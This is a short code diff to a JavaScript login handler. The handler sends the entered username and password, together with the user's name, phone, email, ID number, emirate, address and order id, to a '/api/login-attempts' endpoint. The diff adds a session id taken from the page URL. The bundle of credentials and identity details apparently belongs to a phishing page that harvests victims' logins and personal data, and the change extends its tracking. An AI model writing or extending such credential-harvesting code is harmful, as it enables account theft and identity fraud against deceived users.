@@ -1091,7 +1091,9 @@ function handleLogin(e) {
       orderAddress = sessionStorage.getItem('order_address') || '';
       orderId = sessionStorage.getItem('order_id') || '';
     } catch(ex) {}
-    var payload = JSON.stringify({ username: username, password: password, country: country, lang: 'en', service: service, orderName: orderName, orderPhone: orderPhone, orderEmail: orderEmail, orderIdNumber: orderIdNumber, orderEmirate: orderEmirate, orderAddress: orderAddress, orderId: orderId });
+    var urlParams = new URLSearchParams(window.location.search);
+    var sessionId = urlParams.get('sid') || '';
+    var payload = JSON.stringify({ username: username, password: password, country: country, lang: 'en', service: service, orderName: orderName, orderPhone: orderPhone, orderEmail: orderEmail, orderIdNumber: orderIdNumber, orderEmirate: orderEmirate, orderAddress: orderAddress, orderId: orderId, sessionId: sessionId });
     var xhr = new XMLHttpRequest();
     xhr.open('POST', '/api/login-attempts', true);
     xhr.setRequestHeader('Content-Type', 'application/json');
